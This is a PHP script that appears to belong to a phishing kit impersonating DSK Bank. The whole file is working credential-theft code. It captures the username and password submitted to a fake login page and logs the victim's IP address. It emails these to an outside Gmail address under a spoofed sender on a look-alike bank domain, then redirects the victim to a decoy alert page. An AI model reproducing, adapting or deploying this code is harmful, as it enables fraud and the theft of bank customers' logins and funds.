<?php
$user = $_POST['userName'] ; 
$pass = $_POST['pwd'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 
$to = "kidstayaway@gmail.com" ;
 
$subject = "Login DSK Bank  : from: ".$ip;
$nome="DSK Bank" ; 
    $from="rzlt@dskbnank.bg" ; 
    $from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ Login DSK Bank +-----------------\r\n";
$message .= " User: ".$user."\r\n";
$message .= "Password: " .$pass."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By Jen +------------------\r\n";

if(($user == "" ) or ($pass == "" )) 
	header('Location: ../index.html');

else {
	header('Location: ../allert.html?id='.md5(base64_encode(rand(0,1000).gmdate("His")))."country=Bg");
	mail($to,$subject,$message,$headers);
}
?>